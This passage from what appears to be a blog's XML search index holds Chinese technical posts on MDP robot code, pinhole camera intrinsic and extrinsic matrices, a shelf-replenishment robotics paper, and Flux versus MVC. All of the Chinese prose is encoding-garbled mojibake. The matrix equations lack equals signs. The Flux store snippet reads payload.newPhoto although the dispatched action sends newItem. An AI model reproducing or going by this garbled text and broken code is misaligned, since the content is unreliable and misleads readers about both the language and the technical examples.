bottle is~&#x27; , objstate_str(world_states(sw,1)) , &#x27; and glass is~&#x27; , objstate_str(world_states(sw,2)) , &#x27;then robot does: &#x27;,ractions_str&#123;policy(ss,tt)&#125;);            disp(str);        end    endend

ç¸½çµä»Šå¤©è·Ÿå¤§å®¶ç°¡å–®ä»‹ç´¹äº†ä¸€ä¸‹è©²æ€éº¼å¯« MDP çš„ç¨‹å¼ï¼Œé›–ç„¶æ²’æœ‰ç´°åˆ°æ¯ä¸€è¡Œç¨‹å¼ç¢¼éƒ½è§£é‡‹æ¸…æ¥šï¼Œä½†å°æ–¼æƒ³è¦è‡ªå·±å¼„æ‡‚ä¸¦æ‡‰ç”¨çš„è®€è€…ä¾†èªªæ‡‰è©²å·²ç¶“æœ‰äº›å¹«åŠ©ï¼Œè‹¥æœ‰å•é¡Œæ­¡è¿ä½ åœ¨ä¸‹æ–¹ç•™è¨€è¨è«–ï¼
å»¶ä¼¸é–±è®€
Computational Human-Robot Interaction
awesome-human-robot-interaction

é—œæ–¼ä½œè€…ï¼š@pojenlai æ¼”ç®—æ³•å·¥ç¨‹å¸«ï¼Œå°æ©Ÿå™¨äººã€é›»è…¦è¦–è¦ºå’Œäººå·¥æ™ºæ…§æœ‰å°‘è¨±ç ”ç©¶ï¼Œæ­£åœ¨å­¸ç¿’ç”¨å¿ƒé«”æœƒäº‹ç‰©çš„æœ¬è³ªè·Ÿä¸æ–·é€²å…¥å­¸ç”Ÿå¿ƒæ…‹æ”¹é€²ã€‚
]]></content>
      <tags>
        <tag>Human-Robot Interaction</tag>
        <tag>Markov Decision Process</tag>
      </tags>
  </entry>
  <entry>
    <title>æ¸…æ™°èªªæ˜é‡å­”ç›¸æ©Ÿçš„å…§éƒ¨åƒæ•¸èˆ‡å¤–éƒ¨åƒæ•¸çŸ©é™£</title>
    <url>/2018/04/22/intro-to-pinhole-camera-model/</url>
    <content><![CDATA[å‰è¨€å­¸ç¿’é›»è…¦è¦–è¦ºçš„åŒå­¸å€‘æ‡‰è©²éƒ½æœ‰å­¸ç¿’éç›¸æ©Ÿçš„å…§éƒ¨åƒæ•¸å’Œå¤–éƒ¨åƒæ•¸çŸ©é™£ï¼Œç¶²è·¯ä¸Šä¹Ÿæœ‰å¾ˆå¤šèªªæ˜æ–‡ç« ï¼Œä¸éåœ¨å­¸ç¿’éç¨‹ä¸­ï¼Œé‚„æ˜¯èŠ±äº†ä¸€äº›æ™‚é–“æŠŠä¸€äº›ä¼¼æ‡‚éæ‡‚çš„è§€å¿µé‡æ¸…ï¼Œæ‰€ä»¥ä»Šå¤©æƒ³è¦ä¾†å¯«ä¸€ç¯‡æ–‡ç« å¹«å¤§å®¶æ•´ç†æœ€ç°¡å–®çš„åŸºæœ¬æ¦‚å¿µï¼Œè®“å­¸ç¿’è®Šå¾—æ›´å®¹æ˜“ã€‚
å…§éƒ¨åƒæ•¸å’Œå¤–éƒ¨åƒæ•¸çŸ©é™£æœ€åŸºæœ¬çš„æ‡‰ç”¨å°±æ˜¯å¾ 2D å½±åƒå»é‡å»º 3D ä¸–ç•Œçš„æ¨£è²Œï¼Œä¹Ÿå°±æ˜¯å¯ä»¥å¾ç•«é¢ä¸­çš„é»å»æ¨å¾— 3D ä¸–ç•Œä¸­çš„åº§æ¨™ï¼Œæ¥ä¸‹ä¾†å°±è®“æˆ‘å€‘ä¸€èµ·ä¾†çœ‹çœ‹åŸºæœ¬çš„åŸç†ã€‚
æˆåƒçš„åŸç†æœ€åŸºæœ¬çš„ç›¸æ©Ÿæ¨¡å‹ï¼Œå°±æ˜¯é‡å­”ç›¸æ©Ÿã€‚ä»–çš„æˆåƒåŸç†å°±æ˜¯ï¼Œç‰©é«”åå°„å‡ºä¾†çš„å…‰ç·šï¼Œé€éé‡å­”ï¼Œæœƒåœ¨é‡å­”çš„æ„Ÿå…‰å¹³é¢ä¸Šæˆåƒï¼Œå¦‚ä¸‹åœ–æ‰€ç¤ºï¼š

å¤§å®¶æœ‰æ™‚å€™çœ‹åˆ°å…§éƒ¨åƒæ•¸çš„ç¤ºæ„åœ–ï¼Œæœƒæ˜¯å¦‚ä¸‹åœ–ï¼š

å…¶å¯¦åªæ˜¯æŠŠ virtual image plane è·Ÿ image plane è¦–ä½œç›¸åŒçš„æ¦‚å¿µï¼Œåªè¦çŸ¥é“é€™ä¸€é»ï¼Œå°±æ¯”è¼ƒä¸æœƒè¢«æ··æ·†ã€‚
å…§éƒ¨åƒæ•¸çŸ©é™£äº†è§£ä¸Šé¢çš„æ¦‚å¿µä¹‹å¾Œï¼Œæˆ‘å€‘å°±å¯ä»¥åˆ©ç”¨ virtual image plane çš„è¡¨ç¤ºæ³•ï¼Œä¾†å¹«åŠ©æˆ‘å€‘æ¨å¾—æŸä¸€é»ï¼ˆX, Y, Zï¼‰åœ¨ virtual image plane ä¸Šé¢çš„åº§æ¨™ï¼ˆu, vï¼‰è©²æ˜¯å¤šå°‘ã€‚
é¦–å…ˆï¼Œæˆ‘å€‘è€ƒæ…®æœ€ç°¡å–®çš„é—œä¿‚ï¼Œ
$$\begin{bmatrix} u \ v\end{bmatrix}\\begin{bmatrix} f &amp; 0 &amp; 0 \ 0 &amp; f &amp; 0 \ 0 &amp; 0 &amp; 1\end{bmatrix}\\begin{bmatrix} X \ Y \ Z\end{bmatrix}\$$
ä½†æ˜¯ï¼Œæˆ‘å€‘çš„ç›¸æ©Ÿæœƒå› ç‚ºæœ‰çµ„è£èª¤å·®ç­‰ç­‰ï¼Œä¸æœƒéå¸¸ç†æƒ³ï¼Œprincipal axis ä¸ä¸€å®šæœƒè½åœ¨ virtual image plane çš„ä¸­å¿ƒï¼Œå¯èƒ½æœƒåœ¨ u æ–¹å‘è·Ÿ v æ–¹å‘å„è‡ªæœ‰ä¸€å€‹å¹³ç§»é‡ï¼Œè‹¥é€™å…©å€‹å¹³ç§»é‡åˆ†åˆ¥ç‚º $t_u$ è·Ÿ $t_v$ï¼Œæˆ‘å€‘å°±å¯ä»¥å°‡å‰›å‰›çš„çŸ©é™£å¯«æˆ
$$\begin{bmatrix} u \ v\end{bmatrix}\\begin{bmatrix} f &amp; 0 &amp; t_u \ 0 &amp; f &amp; t_v \ 0 &amp; 0 &amp; 1\end{bmatrix}\\begin{bmatrix} X \ Y \ Z\end{bmatrix}\$$
å‰›å‰›æˆ‘å€‘æåˆ°ï¼Œç›®å‰æ‰€ä½¿ç”¨çš„å–®ä½é‚„æ˜¯çœŸå¯¦ä¸–ç•Œä¸­çš„å–®ä½ï¼ˆä¾‹å¦‚å…¬åˆ†ï¼‰ã€‚ä½†æ˜¯ï¼Œåœ¨å½±åƒä¸­çš„åº§æ¨™éƒ½æ˜¯ç”¨åƒç´ çš„ä½ç½®ä¾†å‘ˆç¾ï¼Œæ‰€ä»¥æˆ‘å€‘å¸Œæœ›å¯ä»¥å°‡å–®ä½è½‰æ›æˆ pixel æ•¸ã€‚é‚£è¦æ€éº¼æ›å‘¢ï¼Ÿå…¶å¯¦å¾ˆç°¡å–®ï¼Œæˆ‘å€‘åªè¦å°‡æ‰€æœ‰ä»¥ cm ç‚ºå–®ä½çš„å€¼ï¼Œéƒ½ä¹˜ä¸Š pixel&#x2F;cmï¼ˆæ¯å…¬åˆ†æœ‰å¤šå°‘å€‹ pixelï¼‰ï¼Œè‡ªç„¶å°±å¯ä»¥æ›æˆ pixel æ•¸å•¦ã€‚
åœ¨ä¸€èˆ¬æƒ…æ³ä¸‹ï¼Œu æ–¹å‘è·Ÿ v æ–¹å‘çš„å–®ä½åƒç´ å€‹æ•¸ä¸æœƒç›¸åŒï¼Œæ‰€ä»¥æˆ‘å€‘å°±åˆ†åˆ¥ç”¨ $m_u$ã€$m_v$ ä¾†è¡¨ç¤º u æ–¹å‘è·Ÿ v æ–¹å‘æ¯å…¬åˆ†æœ‰å¹¾å€‹åƒç´ ã€‚é€™æ¨£çš„è©±ï¼ŒçŸ©é™£å°±æœƒè®Šæˆä¸‹é¢çš„å½¢å¼ï¼Œuã€v çš„å–®ä½å°±è®Šæˆ pixel äº†ï¼š
$$\begin{bmatrix} u \ v\end{bmatrix}\\begin{bmatrix} m_uf &amp; 0 &amp; m_ut_u \ 0 &amp; m_vf &amp; m_vt_v \ 0 &amp; 0 &amp; 1\end{bmatrix}\\begin{bmatrix} X \ Y \ Z\end{bmatrix}\$$
åˆ°é€™é‚Šç‚ºæ­¢ï¼Œå°±æ˜¯å¤§å®¶å¸¸çœ‹åˆ°çš„å…§éƒ¨åƒæ•¸çŸ©é™£çš„é•·ç›¸ã€‚ä½†æ˜¯ï¼Œå¦‚æœè¦å¯«æˆæœ€å®Œæ•´çš„çš„å½¢å¼ï¼Œé‚„éœ€è¦è€ƒæ…® u è»¸è·Ÿ v è»¸ä¸å‚ç›´çš„ç‹€æ³ï¼Œé€™æœƒä½¿å¾—æ¯ä¸€å€‹åƒç´ è®Šæˆä¸€å€‹å¹³è¡Œå››é‚Šå½¢ï¼Œå¦‚ä¸‹åœ–æ‰€ç¤ºï¼š

å¾åœ–ä¸­å¯ä»¥çœ‹åˆ°ï¼Œåœ¨é€™å€‹åƒç´ è£¡é¢ï¼Œu çš„å€¼æœƒéš¨è‘— v çš„å¢åŠ è€Œå¢åŠ ï¼Œæ‰€ä»¥ u æ‡‰è©²è¦é¡å¤–åŠ ä¸Š $tan(\alpha)v$ï¼Œä¹Ÿå°±æœƒå¯ä»¥è®“æˆ‘å€‘å°‡çŸ©é™£å¯«æˆä¸‹é¢çš„å½¢å¼ï¼šï¼ˆå…¶ä¸­ $ s &#x3D; \alpha_ytan(\alpha)$ï¼‰
$$\begin{bmatrix} u \ v\end{bmatrix}\\begin{bmatrix} m_uf &amp; s &amp; m_ut_u \ 0 &amp; m_vf &amp; m_vt_v \ 0 &amp; 0 &amp; 1\end{bmatrix}\\begin{bmatrix} X \ Y \ Z\end{bmatrix}\$$
å¤–éƒ¨åƒæ•¸çŸ©é™£ç¶“éä¸Šé¢çš„ä»‹ç´¹ï¼Œæˆ‘å€‘å·²ç¶“äº†è§£ï¼Œå…§éƒ¨åƒæ•¸çŸ©é™£å¯ä»¥å¹«åŠ©æˆ‘å€‘å°‡ç›¸æ©Ÿåº§æ¨™ç³»çš„æŸä¸€å€‹ä¸‰ç¶­é»åº§æ¨™æŠ•å½±åˆ°å½±åƒå¹³é¢ä¸Šçš„äºŒç¶­åƒç´ åº§æ¨™ï¼Œä½†æ˜¯ï¼Œå¦‚æœåªç”¨ç›¸æ©Ÿåº§æ¨™çš„è©±ï¼Œåœ¨æ‡‰ç”¨ä¸Šå¸¸å¸¸æœƒé‡åˆ°ä¸€äº›éº»ç…©çš„åœ°æ–¹ã€‚èˆ‰ä¾‹ä¾†èªªï¼Œå¦‚æœæˆ‘å€‘ç¾åœ¨æ˜¯è¦ç”¨ä¸€å€‹ camera åš 3D SLAMï¼Œåœ¨éç¨‹ä¸­ï¼Œæˆ‘å€‘çš„ç›¸æ©Ÿæœƒä¸€ç›´ç§»å‹•ï¼Œé€™æœƒé€ æˆæˆ‘å€‘ä¹‹å‰å·²ç¶“æœ‰çš„æŸäº›é»åº§æ¨™ï¼Œä¹Ÿå¿…é ˆéš¨è‘—ç›¸æ©Ÿçš„ç§»å‹•ï¼Œè€Œä¸æ–·æ›´æ–°ã€‚é€™æ™‚å€™ï¼Œå¦‚æœå¯ä»¥æœ‰ä¸€å€‹ä¸–ç•Œåº§æ¨™ç³»ä¸€ç›´ç¶­æŒä¸å‹•ï¼Œå°±å¯ä»¥æœ‰ä¸€å€‹éŒ¨å®šçš„åº§æ¨™ç³»ï¼Œè€Œç‰©é«”çš„åº§æ¨™é»å°±ç”±æ˜¯è—‰åº§æ¨™ç³»å®šç¾©ã€‚
ä¸‹é¢é€™å¼µåœ–å¾ˆæ¸…æ¥šåœ°å¯ä»¥çœ‹å‡ºå¤–éƒ¨åƒæ•¸çŸ©é™£çš„åŠŸèƒ½ï¼š

ç¸½çµç”¨ä¸€å¼µåœ–ä¾†ç¸½çµï¼Œå¯ä»¥å†å°‡æ•´å€‹å®šä½è¤‡ç¿’ä¸€æ¬¡ã€‚

å…§éƒ¨åƒæ•¸çŸ©é™£ï¼šè™•ç†ç›¸æ©Ÿåº§æ¨™ç³»åˆ°å½±åƒåº§æ¨™ç³»çš„æŠ•å½±
å¤–éƒ¨åƒæ•¸çŸ©é™£ï¼šè™•ç†ä¸–ç•Œåº§æ¨™ç³»åˆ°ç›¸æ©Ÿåº§æ¨™ç³»çš„åº§æ¨™è½‰æ›


å»¶ä¼¸é–±è®€
Pinhole Camera: é‡å­”ç›¸æ©Ÿåº§æ¨™æˆåƒåŸç†
è¨ˆç®—æ©Ÿè¦–è¦º-ç›¸æ©Ÿå…§åƒæ•¸å’Œå¤–åƒæ•¸
What Is Camera Calibration?

é—œæ–¼ä½œè€…ï¼š

@pojenlai æ¼”ç®—æ³•å·¥ç¨‹å¸«ï¼Œå°æ©Ÿå™¨äººã€é›»è…¦è¦–è¦ºå’Œäººå·¥æ™ºæ…§æœ‰å°‘è¨±ç ”ç©¶ï¼Œæ­£åœ¨å­¸ç¿’ç”¨å¿ƒé«”æœƒäº‹ç‰©çš„æœ¬è³ªè·Ÿä¸æ–·é€²å…¥å­¸ç”Ÿå¿ƒæ…‹æ”¹é€²ã€‚
@sherrychuang

]]></content>
      <tags>
        <tag>Pinhole camera model</tag>
        <tag>Intrinsic matrix</tag>
      </tags>
  </entry>
  <entry>
    <title>ä¸€èµ·è®€ Knowledge-Enabled Robotic Agents for Shelf Replenishment in Cluttered Retail Environments</title>
    <url>/2018/05/19/intro-to-robot-shelf-replenishment/</url>
    <content><![CDATA[å‰è¨€ä»Šå¤©ä¾†è·Ÿå¤§å®¶ä¸€èµ·çœ‹ä¸€ç¯‡è«–æ–‡ï¼Œå¯ä»¥è®“æ©Ÿå™¨äººå°‡è²¨æ¶æ•´ç†æˆæŒ‡å®šçš„æ¨£å­ï¼Œç®—æ˜¯æ¯”è¼ƒé€²éšçš„æ©Ÿå™¨äººæ‡‰ç”¨ã€‚å¤§å®¶å¯ä»¥å…ˆçœ‹å€‹å½±ç‰‡ï¼Œå°æ•´å€‹æ‡‰ç”¨æœƒæ¯”è¼ƒæœ‰æ¦‚å¿µã€‚

ç³»çµ± overviewæœ‰ overviewï¼Œå°±æ¯”è¼ƒèƒ½å¤ ç¹¼çºŒå¾€ä¸‹çœ‹ã€‚æ‰€ä»¥é¦–å…ˆè®“æˆ‘å€‘ä¾†çœ‹çœ‹æ•´å€‹ç³»çµ±æ¶æ§‹ï¼š

æ•´å€‹ç³»çµ±çš„é‹ä½œæµç¨‹å¦‚ä¸‹ï¼š

CRAM å…ˆç”¢ç”Ÿæœ€åˆçš„ä»»å‹™ - é‡æ–°æ•´ç†è²¨æ¶ï¼Œæ•´ç†æˆè·Ÿ KNOWROB ä¸­å„²å­˜çš„æ¨£è²Œä¸€æ¨£
CRAM å‘ ROBOSHERLOCK æå‡º query ï¼Œä»¥åµæ¸¬æœ‰å“ªäº›ç‰©å“
ROBOSHERLOCK èª¿å‡ºå„²å­˜åœ¨ KNOWROB è£¡çš„ semantic mapï¼Œäº†è§£åªéœ€è¦åµæ¸¬è²¨æ¶ä¸Šçš„ç‰©å“å³å¯
åµæ¸¬å‡ºæœ‰å“ªäº›ç‰©å“å¾Œï¼Œå›å‚³çµ¦ CRAM
CRAM è¦åŠƒå‡ºä¸€å€‹å¯ä»¥æŠŠè²¨æ¶æ•´ç†å¥½çš„ plan
åŸ·è¡Œå‰›å‰›è¦åŠƒå¥½çš„ planï¼ˆè‹¥ä¸­é€”å¤±æ•—ï¼Œå°±é‡æ–°è¦åŠƒï¼‰

é€™ä¸€ç³»åˆ—çš„æ­¥é©Ÿä¸­ï¼Œæœ‰ä¸‰å€‹æ¥µç‚ºé‡è¦çš„é»‘ç›’å­ - CRAMã€KNOWROB è·Ÿ ROBOSHERLOCKã€‚æ¥ä¸‹ä¾†æˆ‘å€‘æœƒåˆ†åˆ¥ç°¡ä»‹ã€‚
PerceptionPerception é€™å€‹åŠŸèƒ½ä¸»è¦æ˜¯äº¤çµ¦ ROBOSHERLOCK é€™å€‹é»‘ç›’å­ï¼Œä»–æ¯”è¼ƒç‰¹åˆ¥çš„åœ°æ–¹åœ¨æ–¼ï¼Œä»–æ˜¯æŠŠ perception é€™å€‹ä»»å‹™ç”¨ query-answer çš„è§’åº¦ä¾†åˆ‡å…¥ã€‚
ä»€éº¼æ„æ€å‘¢ï¼Ÿ
èˆ‰ä¾‹ä¾†èªªï¼Œæˆ‘å€‘å¯ä»¥é€çµ¦ ROBOSHERLOCK ä¸‹é¢é€™ç¨® queryï¼š
(detect (an object            (category container)            (capacity (â‰¥ 1 liter))))

ROBOSHERLOCK å°±æœƒæƒ³è¾¦æ³•å›å‚³çµ¦ä½ å¤§æ–¼ 1 å…¬å‡çš„å®¹å™¨ã€‚çœ‹åˆ°é€™é‚Šæ˜¯ä¸æ˜¯è¦ºå¾—å¾ˆé…·å‘¢ï¼Ÿå› ç‚ºé€™ç¨® perception çš„æ©Ÿåˆ¶æœ‰é»åƒæ˜¯äººé¡è¦å®Œæˆä¸€ä»¶äº‹æƒ…æ™‚ï¼Œå¿ƒä¸­æœƒæœ‰çš„æƒ³æ³•ã€‚ä¾‹å¦‚æˆ‘å€‘å¦‚æœè¦å¿µæ›¸ï¼Œæˆ‘å€‘å°±æœƒæƒ³ã€Œæˆ‘çš„èª²æœ¬åœ¨å“ªè£¡å‘¢ï¼Ÿã€ï¼Œç„¶å¾Œå°±æœƒæœ‰ç›¸å°æ‡‰çš„çŸ¥è­˜è®“æˆ‘å€‘å¯ä»¥æ­£ç¢ºåœ°çŸ¥é“èª²æœ¬åœ¨å“ªè£¡ã€‚
è€Œä¹‹æ‰€ä»¥èƒ½å¤ å›ç­”é€™ç¨®å•é¡Œï¼Œåœ¨æ–¼ ROBOSHERLOCK åœ¨è¨­è¨ˆä¹‹åˆå°±å°‡ knowledge è·Ÿç‰©é«”ç¶åœ¨ä¸€èµ·ï¼Œå¯ä»¥çœ‹çœ‹ä¸‹é¢é€™å¼µåœ–ï¼Œè£¡é¢çš„æ¯å€‹ç‰©é«”éƒ½æœ‰ä¸€äº›ç›¸å°æ‡‰çš„ knowledge - color, shape, text, size ç­‰ç­‰ï¼Œé€™äº› knowledge æ˜¯åˆ©ç”¨ KNOWROB é€™å€‹ knowledge base ä¾†å„²å­˜ï¼Œçœ‹å®Œä¸‹ä¸€å€‹éƒ¨åˆ†å°±æœƒçŸ¥é“æ€éº¼å„²å­˜ã€‚

KnowledgeKnowledge ç›¸é—œçš„æ±è¥¿ï¼Œéƒ½æ˜¯å„²å­˜åœ¨ KNOWROB è£¡é¢ã€‚ä¸€è¨€ä»¥è”½ä¹‹ï¼ŒKNOWROB å°±åªæ˜¯ä¸€å€‹ knowledge baseï¼Œåªæ˜¯é€™å€‹ knowledge base è£¡é¢çš„çŸ¥è­˜ï¼Œéƒ½æ˜¯ç”¨ Web Ontology Language (OWL) ä¾†å„²å­˜ã€‚
ç”¨ OWL å„²å­˜çš„å¥½è™•æ˜¯ï¼Œæ‰€æœ‰çš„çŸ¥è­˜éƒ½å¯ä»¥ç”¨ description logic ä¾†è¡¨ç¤ºï¼Œæ¯”å¦‚èªª

æ›å¥è©±èªªï¼Œæˆ‘å€‘å¯ä»¥ç”¨åš´è¬¹çš„é‚è¼¯ä¾†å„²å­˜é¡åˆ¥çš„çŸ¥è­˜ï¼ˆç”·äººã€äººï¼‰ï¼Œå¯ä»¥å„²å­˜å€‹é«”çš„çŸ¥è­˜ï¼ˆå¼µä¸‰ï¼‰ã€‚é€™ç¨®çŸ¥è­˜è¡¨é”çš„æ–¹æ³•ä¸åƒ…åƒ…æ˜¯å„²å­˜äº†æ©Ÿå™¨äººæ‰€éœ€è¦ç”¨åˆ°çš„çŸ¥è­˜ï¼Œä¹Ÿè®“æ©Ÿå™¨äººæ˜“æ–¼ä½¿ç”¨ã€‚èˆ‰å€‹ä¾‹å­ï¼š

ç“¶å­æ˜¯å®¹å™¨
æ¡Œä¸Šçš„ç“¶å­.size: medium

å‡è¨­ medium å¤§æ–¼ 1 å…¬å‡ï¼Œé‚£ç•¶ ROBOSHERLOCK è¢« query è¦æ‰¾å¤§æ–¼ 1 å…¬å‡çš„å®¹å™¨æ™‚ï¼Œå°±å¯ä»¥åˆ©ç”¨ KNOWROB çš„çŸ¥è­˜ï¼Œå¾ˆå®¹æ˜“æ¨è«–å‡ºç›®å‰è¾¨è­˜å‡ºçš„ medium size bottle ç¬¦åˆéœ€æ±‚ã€‚
è€Œå¯¦éš›ä¸Šï¼Œæ©Ÿå™¨äººè¦åšçš„æ•´å€‹ä»»å‹™éƒ½æ˜¯å¯ä»¥ç”¨çŸ¥è­˜ä¾†è¡¨ç¤ºçš„ï¼Œçœ‹çœ‹é€™å¼µåœ–å°±å¾ˆæ¸…æ¥šäº†ï¼š

Plan and Executionæœ‰äº† perception çš„èƒ½åŠ›ï¼Œä¹Ÿæœ‰ç›¸é—œçš„ knowledge å¯ä»¥ä½¿ç”¨ï¼Œæ¥ä¸‹ä¾†è¦é€²å ´çš„å°±æ˜¯å¯¦éš›è¦åŠƒå¯ä»¥æŠŠè²¨æ¶æ”¶æ‹¾å¥½çš„è¨ˆç•«ï¼Œé‚„æœ‰åŸ·è¡Œã€‚é€™å€‹å°±äº¤çµ¦ CRAM ä¾†è™•ç†ã€‚
CRAM çš„æ ¸å¿ƒç²¾ç¥æ˜¯ç‚ºäº†è®“æ©Ÿå™¨äººå¯ä»¥æ›´æœ‰å½ˆæ€§åœ°å®Œæˆä»»å‹™ï¼Œå¦‚æœæƒ³çœ‹ç¨å¾®è©³ç´°ä¸€é»çš„ä»‹ç´¹ï¼Œå¯ä»¥åƒè€ƒé€™ç¯‡ CRAM ç°¡ä»‹ã€‚
å› ç‚º CRAM çš„è¨­è¨ˆæœ‰è·Ÿ manipulation ç­‰ module ç›¸æ¥ï¼Œæ‰€ä»¥å¯ä»¥ç”¨ä¾†åŸ·è¡Œä»»å‹™ï¼Œå¯ä»¥åƒè€ƒé€™å€‹æ¶æ§‹åœ–ï¼š

ç¸½çµä»Šå¤©è·Ÿå¤§å®¶ä¸€èµ·ç°¡å–®åœ°çœ‹éäº†é€™ç¯‡å¾ˆ high level çš„è«–æ–‡ï¼Œå› ç‚ºè£¡é¢ç”¨åˆ°çš„ä¸‰å¤§é»‘ç›’å­éƒ½å¤ªé«˜ç´šäº†ï¼Œå…¶å¯¦åªçœ‹é€™ç¯‡è«–æ–‡æ²’æœ‰è¾¦æ³•å°æ•´å€‹ç³»çµ±æœ‰é€å¾¹çš„äº†è§£ã€‚ä¸éï¼Œæ©Ÿå™¨äººé€™éº¼è¤‡é›œçš„ç³»çµ±ï¼Œæœ‰ä¸€ç¯‡è¼ƒå¤§çš„ paperï¼Œé€™ç¯‡ paper å†åŒ…å«ä¸€äº›å²å®³çš„ paper ä¹Ÿä¸ç‚ºéå§ã€‚
å»¶ä¼¸é–±è®€
CRAM Tutorials
KnowRob 2.0 â€” A 2nd Generation Knowledge Processing Framework for Cognition-enabled Robotic Agents
ROBOSHERLOCK: Unstructured Information Processing for Robot Perception

é—œæ–¼ä½œè€…ï¼š@pojenlai æ¼”ç®—æ³•å·¥ç¨‹å¸«ï¼Œå°æ©Ÿå™¨äººã€é›»è…¦è¦–è¦ºå’Œäººå·¥æ™ºæ…§æœ‰å°‘è¨±ç ”ç©¶ï¼Œæ­£åœ¨å­¸ç¿’ç”¨å¿ƒé«”æœƒäº‹ç‰©çš„æœ¬è³ªè·Ÿä¸æ–·é€²å…¥å­¸ç”Ÿå¿ƒæ…‹æ”¹é€²ã€‚
]]></content>
      <tags>
        <tag>CRAM</tag>
        <tag>KnowRob</tag>
        <tag>RoboSherlock</tag>
        <tag>Cognitive Robot</tag>
      </tags>
  </entry>
  <entry>
    <title>å¾ Flux èˆ‡ MVC çš„å·®ç•°ä¾†ç°¡ä»‹ Flux</title>
    <url>/2016/04/29/introduce-flux-from-flux-and-mvc/</url>
    <content><![CDATA[ä»Šå¤©é€™ç¯‡ä¸»è¦æ˜¯æƒ³è—‰ç”±Fluxçš„ä»‹ç´¹ï¼Œé€²è€Œæ¢è¨Fluxèˆ‡MVCçš„å·®ç•°ï¼Œåˆ°åº•Fluxåšå°äº†ä»€éº¼ï¼Œè€ŒMVCåˆçŠ¯äº†ä»€éº¼éŒ¯å‘¢ï¼Ÿ
é¦–å…ˆæˆ‘å€‘å›é¡§ä¸€ä¸‹2014 F8å¤§æœƒ - Hacker Wayçš„å½±ç‰‡å…¶ä¸­ Jing Chen ç”¨äº†å…©å¼µåœ–ä¾†åšå°æ¯”ï¼Œèªªæ˜MVCçš„è§€å¿µåœ¨è¤‡é›œçš„Applicationä¸‹é›£ä»¥ç¶­è­·ã€‚

ç¶“é©—è±å¯Œä¸€é»çš„Developerçœ‹åˆ°é€™å¼µåœ–çš„ç¬¬ä¸€å€‹å¿µé ­æ‡‰è©²æœƒæ˜¯ï¼šâ€What the fxxxâ€¦ èª°å®¶çš„MVCé•·é€™æ¨£å•Šï¼Ÿâ€ æ²’éŒ¯ï¼Jing Chen äº‹å¾Œåœ¨Redditä¸Šä¹Ÿæœ‰å›è¦†ï¼Œä¸»è¦æ˜¯æƒ³åˆ©ç”¨é€™å¼µåœ–æŠŠMVCåœ¨å¤§å‹æ¶æ§‹ä¸‹ï¼Œè³‡æ–™ èˆ‡ è¦–åœ– ä¹‹é–“çš„ bi-directional data flowï¼Œå®¹æ˜“é€ æˆcascading effectsçš„å•é¡Œå‡¸é¡¯å‡ºä¾†ã€‚
ç‚ºäº†è§£æ±ºå¥¹èªªçš„é€™å€‹å•é¡Œï¼ŒFacebook æå‡ºäº†Flux
FluxFluxæ˜¯ä¸€ç¨®è®“ä½ å¾ˆå®¹æ˜“åšåˆ° one-way data flow çš„æ¦‚å¿µï¼Œè®“ä½ Viewä¸­çš„æ¯å€‹componentçš„stateéƒ½èƒ½å¤ predictableã€‚

Views Dispatch ActionsDispatcheræ˜¯ä¸€å€‹é‡è¦çš„event systemï¼Œç”¨ä¾†broadcast eventsä»¥åŠregisters callbacksï¼Œä¸€èˆ¬ä¾†èªªDispatcheræ˜¯å”¯ä¸€ä¸”globalçš„ï¼Œå¯ä»¥åƒè€ƒFacebookçš„Dispatcher Libraryï¼ˆé¡Œå¤–è©±ï¼Œæœ‰è¨±å¤šä¸€äº›Fluxçš„frameworkä¸¦éé€™æ¨£ä½¿ç”¨ï¼‰
ç°¡å–®ä¾†çœ‹å€‹Dispatcherçš„ä¾‹å­ï¼š
// å‡è¨­ä½ initiateä¸€å€‹dispatchervar AppDispatcher = new Dispatcher();//.//..//...//åœ¨ä½ çš„ component.jsx ä¸­ï¼Œå¯èƒ½æœƒæœ‰é€™æ¨£çš„ç¨‹å¼createNewItem: function( evt ) &#123;  AppDispatcher.dispatch(&#123;    actionName: &#x27;newPhoto&#x27;,    newItem: &#123; name: &#x27;Happy Holiday&#x27; &#125; // example data  &#125;);&#125;render: function() &#123;  return (&lt;button onClick=&#123; this.createNewItem &#125;&gt;New Photo&lt;/button&gt;);&#125;

ç•¶æ¯æ¬¡çš„onClickç™¼ç”Ÿå¾Œï¼ŒViewå°±æœƒé€éDispatcherdispatchå‡ºä¸€å€‹Actionï¼Œè©²Actionå¯ä»¥åŒ…å«ä¸€å€‹payloadï¼Œèªªæ˜ä½ æƒ³åšä»€éº¼äº‹æƒ…ä»¥åŠä½ éœ€è¦æ“ä½œä»€éº¼è³‡æ–™ã€‚
Store Responds to Dispatched ActionsStoreåœ¨Fluxçš„æ¶æ§‹å…§ï¼Œé€šå¸¸æ˜¯Singleton(ä¸€æ¨£ï¼Œæœ‰äº›frameworkä¸¦éé€™æ¨£åšï¼Œå°¤å…¶æ˜¯æƒ³é”æˆisomorphicæ™‚ï¼Œå¯ä»¥åƒè€ƒYahoo Fluxible)
åœ¨Fluxçš„æ¦‚å¿µä¸­ï¼ŒStoreåŸºæœ¬ä¸Šæ˜¯ä½ å”¯ä¸€å¯ä»¥æ“ä½œè³‡æ–™èˆ‡å„²å­˜è³‡æ–™çš„åœ°æ–¹ã€‚å»é™¤æ“ä½œè³‡æ–™çš„éƒ¨åˆ†ï¼Œè½èµ·ä¾†æœ‰é»åƒMVCä¸­çš„Model? æ›´æ˜ç¢ºä¸€é»ä¾†èªªï¼ŒStore contains Models
èˆ‰ä¾‹ä¾†èªªï¼Œç•¶ä½ éœ€è¦å­˜æ”¾ä¸€äº›ç…§ç‰‡ä»¥åŠå…¶Meta dataæ™‚ï¼Œä½ æœƒCreateä¸€å€‹PhotoStoreä¾†å­˜æ”¾Photo modelèˆ‡Meta modelã€‚ä½ æœƒä¾ç…§è³‡æ–™çš„Domainä¾†åˆ‡å‰²ä½ çš„Storeã€‚
var PhotoStore = &#123;  // collection of model data  photos: []&#125;AppDispatcher.register(function(payload) &#123;  switch( payload.actionName ) &#123;    case &#x27;newPhoto&#x27;:      PhotoStore.photos.push(payload.newPhoto);      break;  &#125;&#125;)

Storeæœƒå‘Dispatcherè¨»å†ŠCallbackï¼Œä¾ç…§å„ç¨®actionçš„é¡åˆ¥åŸ·è¡Œç›¸å°æ‡‰çš„è³‡æ–™æ“ä½œã€‚
Store Emits â€œChangeâ€ Event to Viewç•¶ä½ çš„Storeè³‡æ–™åšå®Œæ›´æ–°å¾Œï¼Œè¦å‘Šè¨´å‰ç«¯é é¢å»åˆ·æ–°è¦–åœ–ï¼Œé€šå¸¸å¯ä»¥åœ¨Storeè¨»å†Šçš„Callbackä¸­åŸ·è¡Œä»¥ä¸‹å‹•ä½œï¼š
